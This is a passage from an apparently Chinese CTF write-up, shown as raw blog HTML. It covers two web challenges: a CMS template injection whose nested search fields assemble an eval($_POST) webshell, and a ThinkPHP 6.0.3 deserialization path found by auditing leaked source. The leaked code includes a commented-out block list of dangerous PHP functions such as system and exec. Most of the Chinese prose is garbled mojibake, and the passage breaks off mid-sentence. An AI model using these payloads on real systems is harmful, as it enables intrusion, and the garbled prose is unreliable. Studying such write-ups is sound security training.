/f1111111111111ag&#x27;</span>);</span><br></pre></td></tr></table></figure><br>å…ˆæ˜¯searchtype=5è¿›å…¥é«˜çº§æœç´¢å¯ä»¥è¿›è¡Œæ¨¡æ¿åµŒå¥—ï¼Œç”±äºå˜é‡é¡ºåºçš„ä¿®æ”¹æ‰€æœ‰åµŒå¥—çš„é¡ºåºå˜ä¸ºsearchword-&gt;area-&gt;yuyan-&gt;ver-&gt;letter-&gt;jq-&gt;year<br>æ¯æ¬¡åµŒå¥—çš„è¯­å¥å˜åŒ–ä¸º<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="keyword">if</span>&#123;searchpage:area&#125;-&gt;&#123;<span class="keyword">if</span>:e&#123;searchpage:lang&#125;&#125;-&gt;&#123;<span class="keyword">if</span>:<span class="keyword">eval</span>(&#123;searchpage:ver&#125;&#125;-&gt;&#123;<span class="keyword">if</span>:<span class="keyword">eval</span>(j&#123;searchpage:letter&#125;&#125;-&gt;&#123;<span class="keyword">if</span>:<span class="keyword">eval</span>(join&#123;searchpage:jq&#125;&#125;-&gt;&#123;<span class="keyword">if</span>:<span class="keyword">eval</span>(<span class="title function_ invoke__">join</span>(<span class="variable">$_</span>&#123;<span class="attr">searchpage</span>:year&#125;&#125;-&gt;&#123;<span class="attr">if</span>:<span class="keyword">eval</span>(<span class="title function_ invoke__">join</span>(<span class="variable">$_POST</span>[<span class="number">9</span>]))&#125;</span><br></pre></td></tr></table></figure><br>æœ€ç»ˆä¼šæ‹¼æ¥ä¸º<code>&#123;if:eval(join($_POST[9]))&#125;</code>è¿™ä¸å°±æ˜¯ä¸€å¥è¯æœ¨é©¬å˜›æˆ‘ä»¬å¯ä»¥åˆ©ç”¨POSTè¿›è¡Œå‘½ä»¤æ‰§è¡Œ<br><strong>æ³¨æ„æ¯ä¸ªå˜é‡çš„å­—ç¬¦æ•°æœ€å¤šä¸º20</strong></p><h2 id="CMSç›´æ¥æ‹¿ä¸‹"><a href="#CMSç›´æ¥æ‹¿ä¸‹" class="headerlink" title="CMSç›´æ¥æ‹¿ä¸‹"></a>CMSç›´æ¥æ‹¿ä¸‹</h2><p>è§£é¢˜äººï¼šLSE<br><img src="/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/thinkphp_1.png" class="" title="alt text"><br>æˆ‘ä»¬å¯ä»¥å‘ç°å…¶ä¸ºthinkphpçš„6.03ç‰ˆæœ¬<br><img src="/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/thinkphp-2.png" class="" title="alt text"><br>æˆ‘ä»¬ä¸Šç½‘æŸ¥ä¸€ä¸‹ä¼šå‘ç°å…¶å­˜åœ¨ååºåˆ—æ¼æ´ï¼Œä½†æ˜¯è¿™ä¸ªæ¼æ´çš„å‰ææ˜¯å¼€å‘è€…é”™è¯¯çš„æ·»åŠ äº†åº”è¯¥ååºåˆ—å…¥å£ä¸”ååºåˆ—åŒ–çš„å†…å®¹å¯æ§ã€‚<br>è¿™é“é¢˜ç›®æˆ‘ä»¬å…ˆè¿›è¡Œä¿¡æ¯æ”¶é›†æ‰«æä¸€ä¸‹ç›®å½•<br><img src="/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/cms-2.png" class="" title="alt text"><br>ä¼šå‘ç°ä¸¤ä¸ªæ¯”è¾ƒé‡è¦çš„è·¯ç”±ï¼Œåˆ†åˆ«æ—¶admin/loginå’Œwww.zip(è¿™å°±æ˜¯æ³„éœ²çš„æºç äº†)<br>æˆ‘ä»¬å…ˆè®¿é—®www.zipä¸‹è½½æºç ï¼Œæ‰“å¼€æºç å°±æ˜¯ä»£ç å®¡è®¡äº†<br><img src="/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/cms-1.png" class="" title="alt text"><br>æˆ‘ä»¬å…ˆåœ¨é¡¹ç›®ä¸­æœç´¢unserializeä¼šå‘ç°api.phpä¸­å­˜åœ¨æˆ‘ä»¬ç‚¹å¼€ä»£ç è¿›è¡Œå®¡æŸ¥ã€‚<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Api</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">Request <span class="variable">$request</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$post</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">post</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">validate</span>(<span class="title class_">User</span>::<span class="variable language_">class</span>)-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$post</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (ValidateException <span class="variable">$e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">json</span>([<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;è´¦å·æˆ–å¯†ç é”™è¯¯!&quot;</span>,<span class="string">&quot;code&quot;</span>=&gt;<span class="number">200</span>,<span class="string">&quot;url&quot;</span>=&gt;<span class="string">&quot;&quot;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$data</span> = <span class="title class_">AdminUser</span>::<span class="title function_ invoke__">where</span>(<span class="string">&#x27;username&#x27;</span>,<span class="variable">$post</span>[<span class="string">&#x27;username&#x27;</span>])-&gt;<span class="title function_ invoke__">findOrEmpty</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data</span>-&gt;<span class="title function_ invoke__">isEmpty</span>() &amp;&amp; <span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="variable">$post</span>[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line">            <span class="variable">$userinfo</span> = [</span><br><span class="line">                <span class="string">&quot;id&quot;</span>=&gt;<span class="variable">$data</span>[<span class="string">&#x27;id&#x27;</span>],</span><br><span class="line">                <span class="string">&quot;username&quot;</span>=&gt;<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>],</span><br><span class="line">                <span class="string">&quot;password&quot;</span>=&gt;<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>],</span><br><span class="line">            ];</span><br><span class="line">            <span class="title class_">Session</span>::<span class="title function_ invoke__">set</span>(<span class="string">&#x27;userinfo&#x27;</span>,<span class="variable">$userinfo</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">json</span>([<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;ç™»é™†æˆåŠŸ!&quot;</span>,<span class="string">&quot;code&quot;</span>=&gt;<span class="number">200</span>,<span class="string">&quot;url&quot;</span>=&gt;<span class="string">&quot;/admin/index&quot;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">json</span>([<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;è´¦å·æˆ–å¯†ç é”™è¯¯!&quot;</span>,<span class="string">&quot;code&quot;</span>=&gt;<span class="number">404</span>,<span class="string">&quot;url&quot;</span>=&gt;<span class="string">&quot;/admin/login&quot;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">list</span>(<span class="params">Request <span class="variable">$request</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$userinfo</span> = <span class="title class_">Session</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;userinfo&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_null</span>(<span class="variable">$userinfo</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">redirect</span>(<span class="string">&#x27;/admin/login&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">Datas</span>;</span><br><span class="line">            <span class="variable">$page</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;page&#x27;</span>,<span class="number">1</span>);</span><br><span class="line">            <span class="variable">$limit</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;limit&#x27;</span>,<span class="number">10</span>);</span><br><span class="line">            <span class="variable">$where</span> = [];</span><br><span class="line">            <span class="variable">$datas</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">where</span>(<span class="variable">$where</span>)-&gt;<span class="title function_ invoke__">field</span>(<span class="string">&#x27;serialize&#x27;</span>)-&gt;<span class="title function_ invoke__">page</span>(<span class="variable">$page</span>,<span class="variable">$limit</span>)-&gt;<span class="title function_ invoke__">select</span>();</span><br><span class="line">            <span class="variable">$count</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">where</span>(<span class="variable">$where</span>)-&gt;<span class="title function_ invoke__">count</span>();</span><br><span class="line"></span><br><span class="line">            <span class="variable">$lists</span> = [];</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$datas</span> <span class="keyword">as</span> <span class="variable">$data</span>)&#123;</span><br><span class="line">                <span class="variable">$data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>[<span class="string">&#x27;serialize&#x27;</span>]);</span><br><span class="line">                <span class="variable">$lists</span>[] = [</span><br><span class="line">                    <span class="string">&quot;id&quot;</span> =&gt; <span class="variable">$data</span>-&gt;id,</span><br><span class="line">                    <span class="string">&quot;name&quot;</span> =&gt; <span class="variable">$data</span>-&gt;name,</span><br><span class="line">                    <span class="string">&quot;score1&quot;</span> =&gt; <span class="variable">$data</span>-&gt;score1,</span><br><span class="line">                    <span class="string">&quot;score2&quot;</span> =&gt; <span class="variable">$data</span>-&gt;score2,</span><br><span class="line">                    <span class="string">&quot;score3&quot;</span> =&gt; <span class="variable">$data</span>-&gt;score3,</span><br><span class="line">                    <span class="string">&quot;average&quot;</span> =&gt; <span class="variable">$data</span>-&gt;average];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">json</span>([<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>, <span class="string">&quot;data&quot;</span>=&gt;<span class="variable">$lists</span>, <span class="string">&quot;count&quot;</span>=&gt;<span class="variable">$count</span>, <span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;è·å–æˆåŠŸ&quot;</span>, ]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params">Request <span class="variable">$request</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$userinfo</span> = <span class="title class_">Session</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;userinfo&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_null</span>(<span class="variable">$userinfo</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">redirect</span>(<span class="string">&#x27;/admin/login&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$data</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">post</span>(<span class="string">&#x27;data&#x27;</span>);</span><br><span class="line">            <span class="comment">// if(preg_match(&quot;/include|include_once|require|require_once|highlight_file|fopen|readfile|fread|fgetss|fgets|parse_ini_file|show_source|flag|move_uploaded_file|file_put_contents|unlink|eval|assert|preg_replace|call_user_func|call_user_func_array|array_map|usort|uasort|uksort|array_filter|array_reduce|array_diff_uassoc|array_diff_ukey|array_udiff|array_udiff_assoc|array_udiff_uassoc|array_intersect_assoc|array_intersect_uassoc|array_uintersect|array_uintersect_assoc|array_uintersect_uassoc|array_walk|array_walk_recursive|xml_set_character_data_handler|xml_set_default_handler|xml_set_element_handler|xml_set_end_namespace_decl_handler|xml_set_external_entity_ref_handler|xml_set_notation_decl_handler|xml_set_processing_instruction_handler|xml_set_start_namespace_decl_handler|xml_set_unparsed_entity_decl_handler|stream_filter_register|set_error_handler|register_shutdown_function|register_tick_function|system|exec|shell_exec|passthru|pcntl_exec|popen|proc_open/i&quot;,$data))&#123;</span></span><br><span class="line">            <span class="comment">//     return json([&quot;code&quot;=&gt;404,&quot;msg&quot;=&gt;&quot;ä½ æƒ³å¹²å˜›ï¼ï¼ï¼&quot;]);</span></span><br><span class="line">            <span class="comment">// &#125;</span></span><br><span class="line"><span class="comment">//            éšä¾¿å§ï¼Œæ— æ‰€è°“äº†ï¼Œä¸æƒ³å†ç¼–ç¨‹ä¸‹å»äº†</span></span><br><span class="line">            <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">Datas</span>;</span><br><span class="line">            <span class="variable">$result</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">save</span>([<span class="string">&#x27;serialize&#x27;</span>=&gt;<span class="variable">$data</span>]);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">json</span>([<span class="string">&quot;code&quot;</span>=&gt;<span class="number">200</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;ä¿®æ”¹æˆåŠŸ&quot;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    ä¸æƒ³å†ç¼–ç¨‹ä¸‹å»äº†ï¼Œç›´æ¥ä¸¢ä¸€ä¸ªåºåˆ—åŒ–çš„æ¥å£ï¼Œçœäº‹</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seria</span>(<span class="params">Request <span class="variable">$request</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$userinfo</span> = <span class="title class_">Session</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;userinfo&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_null</span>(<span class="variable">$userinfo</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">redirect</span>(<span class="string">&#x27;/admin/login&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$seria</span> =  <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Student</span>(</span><br><span class="line">                <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">post</span>(<span class="string">&#x27;id&#x27;</span>,<span class="number">2</span>),</span><br><span class="line">                <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">post</span>(<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;æå››&#x27;</span>),</span><br><span class="line">                <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">post</span>(<span class="string">&#x27;score1&#x27;</span>,<span class="number">91</span>),</span><br><span class="line">                <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">post</span>(<span class="string">&#x27;score2&#x27;</span>,<span class="number">92</span>),</span><br><span class="line">                <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">post</span>(<span class="string">&#x27;score3&#x27;</span>,<span class="number">93</span>)</span><br><span class="line">            ));</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">json</span>([<span class="string">&quot;code&quot;</span>=&gt;<span class="number">200</span>, <span class="string">&quot;data&quot;</span>=&gt;<span class="variable">$seria</span>, <span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;è·å–æˆåŠŸ&quot;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">users</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">AdminUser</span>;</span><br><span class="line">        <span class="variable">$datas</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">select</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">json</span>([<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>, <span class="string">&quot;data&quot;</span>=&gt;<span class="variable">$datas</span>, <span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;è·å–æˆåŠŸ&quot;</span>, ]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬ä¸€æ­¥æ­¥åˆ†æä¼šå‘ç°listå‡½æ•°å­˜åœ¨unserializeçš„å…¥å£ã€‚ä¸‹é¢æˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹listå‡½æ•°<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">list</span>(<span class="params">Request <span class="variable">$request</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$userinfo</span> = <span class="title class_">Session</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;userinfo&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_null</span>(<span class="variable">$userinfo</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">redirect</span>(<span class="string">&#x27;/admin/login&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">Datas</span>;</span><br><span class="line">            <span class="variable">$page</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;page&#x27;</span>,<span class="number">1</span>);</span><br><span class="line">            <span class="variable">$limit</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;limit&#x27;</span>,<span class="number">10</span>);</span><br><span class="line">            <span class="variable">$where</span> = [];</span><br><span class="line">            <span class="variable">$datas</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">where</span>(<span class="variable">$where</span>)-&gt;<span class="title function_ invoke__">field</span>(<span class="string">&#x27;serialize&#x27;</span>)-&gt;<span class="title function_ invoke__">page</span>(<span class="variable">$page</span>,<span class="variable">$limit</span>)-&gt;<span class="title function_ invoke__">select</span>();</span><br><span class="line">            <span class="variable">$count</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">where</span>(<span class="variable">$where</span>)-&gt;<span class="title function_ invoke__">count</span>();</span><br><span class="line"></span><br><span class="line">            <span class="variable">$lists</span> = [];</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$datas</span> <span class="keyword">as</span> <span class="variable">$data</span>)&#123;</span><br><span class="line">                <span class="variable">$data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>[<span class="string">&#x27;serialize&#x27;</span>]);</span><br><span class="line">                <span class="variable">$lists</span>[] = [</span><br><span class="line">                    <span class="string">&quot;id&quot;</span> =&gt; <span class="variable">$data</span>-&gt;id,</span><br><span class="line">                    <span class="string">&quot;name&quot;</span> =&gt; <span class="variable">$data</span>-&gt;name,</span><br><span class="line">                    <span class="string">&quot;score1&quot;</span> =&gt; <span class="variable">$data</span>-&gt;score1,</span><br><span class="line">                    <span class="string">&quot;score2&quot;</span> =&gt; <span class="variable">$data</span>-&gt;score2,</span><br><span class="line">                    <span class="string">&quot;score3&quot;</span> =&gt; <span class="variable">$data</span>-&gt;score3,</span><br><span class="line">                    <span class="string">&quot;average&quot;</span> =&gt; <span class="variable">$data</span>-&gt;average];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">json</span>([<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>, <span class="string">&quot;data&quot;</span>=&gt;<span class="variable">$lists</span>, <span class="string">&quot;count&quot;</span>=&gt;<span class="variable">$count</span>, <span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;è·å–æˆåŠŸ&quot;</span>, ]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>ä¼šå‘ç°å…¶åˆ©ç”¨äº†<code>is_null($userinfo)</code>æ¥æ£€æµ‹ç™»é™†çŠ¶æ€(æ€ä¹ˆç™»é™†åé¢å†è¯´)ï¼Œæ£€æµ‹é€šè¿‡åå°±å¯ä»¥è¿›å…¥é“ååºåˆ—çš„ä»£ç äº†ã€‚<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">Datas</span>;</span><br><span class="line"><span class="variable">$datas</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">where</span>(<span class="variable">$where</span>)-&gt;<span class="title function_ invoke__">field</span>(<span class="string">&#x27;serialize&#x27;</span>)-&gt;<span class="title function_ invoke__">page</span>(<span class="variable">$page</span>,<span class="variable">$limit</span>)-&gt;<span class="title function_ invoke__">select</span>();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$datas</span> <span class="keyword">as</span> <span class="variable">$data</span>)&#123;</span><br><span class="line">                <span class="variable">$data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>[<span class="string">&#x27;serialize&#x27;</span>]);</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure><br>ä¸Šé¢æ˜¯å…³é”®çš„å‡ å¥ä»£ç ã€‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…ˆé”®Dataså¯¹è±¡å®ä¾‹åŒ–æˆdbï¼Œå†ä»dbä¸­æŸ¥è¯¢å…·serializeçš„æ•°æ®å¹¶èµ‹å€¼ä¸ª<code>$datas</code>ï¼Œdataså˜é‡æœ‰ç»è¿‡å¾ªç¯èµ‹å€¼ç»™<code>data</code>å†å¯¹<code>$data[&#39;serialize&#39;]</code>è¿›è¡Œååºåˆ—åŒ–ã€‚<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params">Request <span class="variable">$request</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$userinfo</span> = <span class="title class_">Session</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;userinfo&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_null</span>(<span class="variable">$userinfo</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">redirect</span>(<span class="string">&#x27;/admin/login&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$data</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">post</span>(<span class="string">&#x27;data&#x27;</span>);</span><br><span class="line">            <span class="comment">// if(preg_match(&quot;/include|include_once|require|require_once|highlight_file|fopen|readfile|fread|fgetss|fgets|parse_ini_file|show_source|flag|move_uploaded_file|file_put_contents|unlink|eval|assert|preg_replace|call_user_func|call_user_func_array|array_map|usort|uasort|uksort|array_filter|array_reduce|array_diff_uassoc|array_diff_ukey|array_udiff|array_udiff_assoc|array_udiff_uassoc|array_intersect_assoc|array_intersect_uassoc|array_uintersect|array_uintersect_assoc|array_uintersect_uassoc|array_walk|array_walk_recursive|xml_set_character_data_handler|xml_set_default_handler|xml_set_element_handler|xml_set_end_namespace_decl_handler|xml_set_external_entity_ref_handler|xml_set_notation_decl_handler|xml_set_processing_instruction_handler|xml_set_start_namespace_decl_handler|xml_set_unparsed_entity_decl_handler|stream_filter_register|set_error_handler|register_shutdown_function|register_tick_function|system|exec|shell_exec|passthru|pcntl_exec|popen|proc_open/i&quot;,$data))&#123;</span></span><br><span class="line">            <span class="comment">//     return json([&quot;code&quot;=&gt;404,&quot;msg&quot;=&gt;&quot;ä½ æƒ³å¹²å˜›ï¼ï¼ï¼&quot;]);</span></span><br><span class="line">            <span class="comment">// &#125;</span></span><br><span class="line"><span class="comment">//            éšä¾¿å§ï¼Œæ— æ‰€è°“äº†ï¼Œä¸æƒ³å†ç¼–ç¨‹ä¸‹å»äº†</span></span><br><span class="line">            <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">Datas</span>;</span><br><span class="line">            <span class="variable">$result</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">save</span>([<span class="string">&#x27;serialize&#x27;</span>=&gt;<span class="variable">$data</span>]);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">json</span>([<span class="string">&quot;code&quot;</span>=&gt;<span class="number">200</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;ä¿®æ”¹æˆåŠŸ&quot;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å†è¿›è¡Œä»£ç å®¡è®¡ã€‚ä¼šå‘ç°åœ¨updateæ–¹æ³•ä¸­å­˜åœ¨ä¸Šä¼ <code>$request-&gt;post(&#39;data&#39;);</code>æ•°æ®è‡³dbï¼Œä¸”dbä¹Ÿæ˜¯Dataså¯¹è±¡çš„å®ä¾‹ã€‚<br>é‚£ä¹ˆè¿™ä¸ªæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è§¦å‘updateæ–¹æ³•ä¸Šä¼ ç½‘ä¸Šåˆ©ç”¨çš„pocè‡³Datasï¼Œå†è§¦å‘listæ–¹æ³•å°±å¯ä»¥æˆåŠŸè¿›è¡Œååºåˆ—åŒ–äº†ã€‚<br>é‚£ä¹ˆæˆ‘ä»¬å°±å‘ç°äº†è¿™ä¸ªååºåˆ—çš„åˆ©ç”¨å…¥å£ã€‚å°±åªå·®æœ€åä¸€æ­¥äº†ï¼Œå°±æ˜¯å¦‚ä½•ç»•è¿‡ç™»é™†ã€‚<br>æˆ‘ä»¬å†è¿›è¡Œä»£ç 